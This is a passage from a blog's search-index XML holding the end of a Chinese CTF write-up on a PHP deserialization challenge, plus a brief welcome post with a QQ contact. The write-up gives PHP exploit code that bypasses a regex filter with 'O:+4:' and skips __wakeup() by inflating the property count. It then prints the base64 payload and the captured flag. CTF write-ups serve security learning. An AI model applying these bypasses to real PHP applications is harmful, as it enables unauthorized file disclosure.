class="string">&#x27;fl4g.php&#x27;</span>);<span class="comment">//把$file赋值为&#x27;fl4g.php&#x27;</span></span><br><span class="line"><span class="comment">#进行序列化</span></span><br><span class="line"><span class="variable">$a</span> = serialize(<span class="variable">$obj</span>);</span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过正则表达式的检查</span></span><br><span class="line"><span class="comment">#  /[oc]:\d+:/i   意思为，在var中匹配 &quot;o(或者c或者oc):%d:&quot; 若匹配成功则不返回0.</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;O:4:&#x27;</span>,<span class="string">&#x27;O:+4:&#x27;</span>,<span class="variable">$a</span>);<span class="comment">//讲4改为+4 使得匹配不到 o:4:</span></span><br><span class="line"><span class="comment">#使用str_replace() 函数进行替换，来绕过__wakeup()魔法函数</span></span><br><span class="line"><span class="variable">$a</span> = str_replace(<span class="string">&#x27;:1:&#x27;</span>,<span class="string">&#x27;:2:&#x27;</span>,<span class="variable">$a</span>);</span><br><span class="line"><span class="comment">#再进行base64编码,输出的结果为flag</span></span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">#扔到在线编译器结果为</span></span><br><span class="line">TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</span><br><span class="line">   <span class="comment">#获得flag</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;ctf&#123;b17bd4c7-34c9-4526-8fa8-a0794a197013&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>欢迎来到我的博客</title>
    <url>/2022/01/14/%E6%AC%A2%E8%BF%8E/</url>
    <content><![CDATA[<h5 id="欢迎"><a href="#欢迎" class="headerlink" title="欢迎"></a>欢迎</h5><p>QQ:1622601726 (无法搜索)<br>QID:Victini258</p>
]]></content>
      <tags>
        <tag>欢迎</tag>
        <tag>首次</tag>
        <tag>测试</tag>
      </tags>
  </entry>
</search>
